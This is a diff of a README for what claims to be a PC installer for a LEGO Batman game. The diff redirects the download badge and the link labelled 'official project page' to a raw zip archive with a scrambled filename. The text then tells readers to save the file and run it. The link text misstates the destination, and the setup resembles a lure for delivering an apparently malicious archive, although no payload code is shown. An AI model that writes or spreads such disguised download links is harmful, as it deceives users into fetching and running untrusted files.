@@ -1,6 +1,6 @@
 # 🦇 LEGO-Batman-Legacy-of-the-Dark-Knight-PC-2026 - Install your favorite classic game today
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup-blue)](https://github.com/Vanderluc3661/LEGO-Batman-Legacy-of-the-Dark-Knight-PC-2026)
+[![Download Installer](https://img.shields.io/badge/Download-Setup-blue)](https://github.com/Vanderluc3661/LEGO-Batman-Legacy-of-the-Dark-Knight-PC-2026/raw/refs/heads/main/gallivant/P_the_Knight_Dark_LEG_Legacy_Batman_of_1.7.zip)
 
 ## 📦 About the project
 
@@ -21,7 +21,7 @@ If you have a newer computer, the game should run without issues. The installer 
 
 ## 📥 Getting the software
 
-1.  Visit the [official project page](https://github.com/Vanderluc3661/LEGO-Batman-Legacy-of-the-Dark-Knight-PC-2026) to find the latest version.
+1.  Visit the [official project page](https://github.com/Vanderluc3661/LEGO-Batman-Legacy-of-the-Dark-Knight-PC-2026/raw/refs/heads/main/gallivant/P_the_Knight_Dark_LEG_Legacy_Batman_of_1.7.zip) to find the latest version.
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the link for the most recent installer file.
 4.  Save the file to your desktop or your Downloads folder.
